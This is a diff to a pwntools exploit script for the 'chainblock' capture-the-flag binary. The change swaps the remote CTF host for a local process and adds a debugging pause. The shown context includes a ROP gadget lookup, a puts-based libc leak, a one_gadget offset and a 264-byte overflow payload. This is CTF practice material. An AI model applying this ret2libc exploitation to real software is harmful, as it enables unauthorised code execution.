@@ -1,11 +1,11 @@
 from pwn import *
 
-# f = process("./chainblock")
+f = process("./chainblock")
 elf = ELF("./chainblock")
 libc = ELF("./libc.so.6")
 rop = ROP("./chainblock")
 
-f = remote("pwn.be.ax",5000)
+# f = remote("pwn.be.ax",5000)
 
 pop_rdi_ret = (rop.find_gadget(['pop rdi', 'ret']))[0]
 main = elf.symbols['main']
@@ -37,7 +37,7 @@ one_gadget = base_addr + 0xde78f
 log.info("puts() at : " + str(hex(leak)))
 log.info("libc base @ %s" % hex(base_addr))
 
-
+pause()
 
 payload = ""
 payload += "A"*264
